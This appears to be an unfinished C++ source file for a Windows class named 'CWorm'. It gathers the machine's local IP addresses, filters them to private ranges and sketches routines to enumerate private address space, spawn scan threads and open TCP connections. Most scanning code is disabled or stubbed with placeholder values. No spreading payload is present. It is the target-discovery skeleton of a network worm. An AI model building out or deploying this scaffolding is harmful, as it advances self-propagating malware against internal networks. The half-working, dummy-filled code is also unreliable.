#include "stdafx.h"
#include "Worm.h"
#include <iostream>
#include <vector>
#include <string>
#include <Winsock2.h>
#include<process.h>
#include "CNetCardInfo.h"
#include "CGlobalConfig.h"

using namespace std;

#pragma comment(lib, "Ws2_32.lib")
#if 1
CWorm::CWorm()
{
	M_SCACNN_MAX_THREADS = 1;
	m_IpsQueue = new CCASQueue<string>;
	m_IpsQueue->init();
	//CCASQueue<string> m_IpsQueue(1000);
}
#endif


CWorm::~CWorm()
{
	
}

void CWorm::Init()
{
	
	//m_IpsQueue = CCASQueue<string>();
	m_IpsQueue->enqueue("axddfa.");
	//CCASQueue<string> m_IpsQueue(10000);
	
	auto netcards_info = CNetCardInfo::GetNetworkInfo();
	for (auto& info : netcards_info)
	{
		//info->show();
		m_LocalIps.push_back(info->GetNetCardInfo().ip);
		m_LocalMasks.push_back(info->GetNetCardInfo().ip_mask);
	}
	//m_IpsQueue(1000);
	//CGlobalConfig::n = 0;

	for (string ip : m_LocalIps)
	{
		cout << ip << "==" << endl;
	}
	//CGlobalConfig::gLocalIps = m_LocalIps;
	//CGlobalConfig::GlobalLocalMasks = m_LocalMasks;
	

	
	for (string ip : m_LocalIps)
	{
		cout << ip << endl;
		string ip_byte_3 = split(ip, ".")[3];
		string ip_byte_2 = split(ip, ".")[2];
		string ip_byte_1 = split(ip, ".")[1];
		string ip_byte_0 = split(ip, ".")[0];

		if (ip_byte_0._Equal("10") || ip_byte_0._Equal("172") || (ip_byte_0._Equal("192") && ip_byte_1._Equal("168")))
		{
			if (ip_byte_0._Equal("172"))
			{
				
				if(atoi(ip_byte_1.c_str())> 31 || atoi(ip_byte_1.c_str()) < 16)
					continue;
			}
			CGlobalConfig::gLocalIps.push_back(ip);

		}
			
	}
	
	for (string ip : CGlobalConfig::gLocalIps)
	{
		cout << "===========================" << endl;
		cout <<  ip << endl;
		cout << "===========================" << endl;
	}
	
#if 0

	for (string ip : m_LocalIps)
	{
		cout << ip << endl;
	}

	for (string ip_mask : m_LocalMasks)
	{
		cout << ip_mask << endl;
	}
#endif

}
void  CWorm::pthread_sacn(LPVOID lpParameter)
{
	CWorm * worm = (CWorm *)lpParameter;
	//cout << __this->M_SCACNN_MAX_THREADS << endl;
	worm->Dequeue();

	return;
}


/*
10.0.0.0~10.255.255.255（A类）
172.16.0.0~172.31.255.255（B类）
192.168.0.0~192.168.255.255（C类）
*/
void CWorm::GenerateScanIps()
{
	//vector<int> a = { 10,0,0,0 };
	//CCASQueue<string> ipsQueue(100000000);
	

	//char a[4] = { 0 };
	//char b[4] = { 0 };
	//char c[4] = { 0 };
	int i, j, k;

#if 0
	for (i = 0; i < 255; i++) 
	{
		for (j = 0; j < 255; j++) 
		{
			for (k = 1; k < 255; k++)
			{
				sprintf(a, "%d", i);
				sprintf(b, "%d", j);
				sprintf(c, "%d", k);
				string ipA = string("10") + string(".") + string(a) + string(".") + string(b) + string(".") + string(c);
				
				//CGlobalConfig::GlobalScanIpsA.push_back(ipA);
				m_IpsQueue.enqueue(ipA);
			}

		}
	}

	cout << CGlobalConfig::GlobalScanIpsA.size() << endl;
	cout << "Gen ipa stop" << endl;

#endif
#if 0
	cout << "current size " << m_IpsQueue.GetCurSize() << endl;

	for (i = 16; i < 32; i++)
	{
		for (j = 0; j < 255; j++)
		{
			for (k = 1; k < 255; k++)
			{
				sprintf(a, "%d", i);
				sprintf(b, "%d", j);
				sprintf(c, "%d", k);
				string ipB = string("172") + string(".") + string(a) + string(".") + string(b) + string(".") + string(c);
				//cout << string("10") + string(".") + string(a) + string(".") + string(b) + string(".") + string(c) << endl;
				//CGlobalConfig::GlobalScanIpsB.push_back(ipB);
				m_IpsQueue.enqueue(ipB);
				memset(a, 0, sizeof(a));
				memset(b, 0, sizeof(b));
				memset(c, 0, sizeof(c));
				//cout << "current size " << m_IpsQueue.GetCurSize() << endl;
			}

		}
	}
	//cout << CGlobalConfig::GlobalScanIpsB.size() << endl;
	cout << "Gen ipB stop" << endl;
	cout << "current size " << m_IpsQueue.GetCurSize() << endl;
#endif

#if 1
	//memset(a, 0, sizeof(a));
	//memset(b, 0, sizeof(b));

	for (j = 0; j < 255; j++)
	{
		for (k = 1; k < 20; k++)
		{
			//sprintf(a, "%d", j);
			//sprintf(b, "%d", k);
			//string ipC = string("192");// +string(".") + string("168") + string(".") + string(a) + string(".") + string(b);
			//cout << string("10") + string(".") + string(a) + string(".") + string(b) + string(".") + string(c) << endl;
			CGlobalConfig::GlobalScanIpsC.push_back("12.21.31.1");
			
			m_IpsQueue->enqueue(string("1"));

		}
	}
	cout << CGlobalConfig::GlobalScanIpsC.size() << endl;
	cout << "Gen ipC stop" << endl;
	cout << "current size " << m_IpsQueue->GetCurSize() << endl;
	m_LocalIps = CGlobalConfig::GlobalScanIpsC;
	Sleep(1000);
	
#endif
#if 0
	Sleep(5000);
	string ip;
	long tmp = m_IpsQueue.GetCurSize();
	while (0) {
		this->m_IpsQueue.dequeue(ip);
		//m_IpsQueue.dequeue(ip);
		cout << ip << endl;
		//Sleep(1);
	}
	cout << "current size " << m_IpsQueue.GetCurSize() << endl;
#endif	
}
void CWorm::Scan()
{
	cout << "This is Worm Scan" << endl;
	WaitMaster();

	vector<string> ips;
	vector<string> resultIps;
	vector<string> localIps = CGlobalConfig::gLocalIps;
	vector<string> localMasks = CGlobalConfig::GlobalLocalMasks;

	
	//GenerateScanIps();
	M_SCACNN_MAX_THREADS = 1;
	string temp;
	while (0) {
		cout << "================================" << m_IpsQueue->GetCurSize() << endl;
		m_IpsQueue->dequeue(temp);
		//(worm->m_IpsQueue)->enqueue("adfas");
		cout << "ip is " << temp << endl;
		cout << "================================" << endl;
		cout << endl << endl << endl;
		Sleep(3000);

	}
	
#if 0
	for (int i = 0; i < localIps.size(); i++) {
		
		/*
		for(string ip : ips)
		{
			resultIps.push_back(ip);
		}
		
		string ip_byte_3 = split(ip, ".")[3];
		string ip_byte_2 = split(ip, ".")[2];
		string ip_byte_1 = split(ip, ".")[1];
		string ip_byte_0 = split(ip, ".")[0];
		
		
		if (ip_byte_3._Equal("255") || ip_byte_3._Equal("0") || ip_byte_3._Equal("1") || ip_byte_2._Equal("255"))
			continue;
		ips.push_back(ip);
		*/
		//cout << ip << endl;
	}
#endif

#if 0
	for (int i = 0; i < M_SCACNN_MAX_THREADS; i++)
	{
		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pthread_sacn, (LPVOID)this, 0, NULL);
		//CloseHandle(hThread);
		if (NULL == hThread)
		{
			cout << "Fail" << endl;
		}
		else
		{
			cout << "Success" << endl;
		}
	}
#endif
	//Sleep(1000000000);
}
void CWorm::Launch()
{
	int thread_count = 1;
	auto lambda_fun = [&](int i) -> void {
		//this->numbers[i] = i;
		cout << "This is thread" << endl;

		//for (int j = 0; j < 10000; j++);
	};

	//! 创建线程
	for (int i = 0; i < thread_count; i++) {
		ts.push_back(thread(lambda_fun, i));
	}
	//! 等待子线程结束
	for (int i = 0; i < thread_count; i++) {
		//ts[i].join();
	}
	cout << "ffffffffffffffffffffff" << endl;

#if 0
	for (int i = 0; i < M_SCACNN_MAX_THREADS; i++)
	{
		//HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&pthread_sacn, (LPVOID)this, 0, NULL);
		HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&pthread_sacn, (LPVOID)this, 0, NULL);
		//CloseHandle(hThread);
		if (NULL == hThread)
		{
			cout << "Fail" << endl;
		}
		else
		{
			cout << "Success" << endl;
		}
	}
#endif
	//Sleep(100000);
}
BOOL CWorm::Connect(char *lpszServerIp, int iServerPort)
{
	WSADATA wsaData = {0};
	::WSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKET sock = ::socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET == sock) {
		return FALSE;
	}
	sockaddr_in  addr = {0};
	addr.sin_family = AF_INET;
	addr.sin_port = htons(iServerPort);
	addr.sin_addr.S_un.S_addr = ::inet_addr(lpszServerIp);
	if (0 != ::connect(sock, (sockaddr *)(&addr), sizeof(addr)))
	{
		return FALSE;
	}
	return TRUE;
}

void CWorm::WaitMaster()
{
	return;
}

vector<string> CWorm::split(const string& str, const string& delim) {
	vector<string> res;
	if ("" == str) return res;
	//先将要切割的字符串从string类型转换为char*类型  
	char* strs = new char[str.length() + 1]; //不要忘了  
	strcpy(strs, str.c_str());

	char* d = new char[delim.length() + 1];
	strcpy(d, delim.c_str());

	char* p = strtok(strs, d);
	while (p) {
		string s = p; //分割得到的字符串转换为string类型  
		res.push_back(s); //存入结果数组  
		p = strtok(NULL, d);
	}
	return res;
}
void CWorm::Dequeue()
{
	cout << M_SCACNN_MAX_THREADS << "++" << endl;
	for (string ip : m_LocalIps) {
		cout << ip << endl;
	}
	string temp;
	while (0) {

		//m_IpsQueue->dequeue(temp);
		cout << "ip is " << temp << endl;
		cout << "================================" << endl;
		Sleep(1000);

	}
}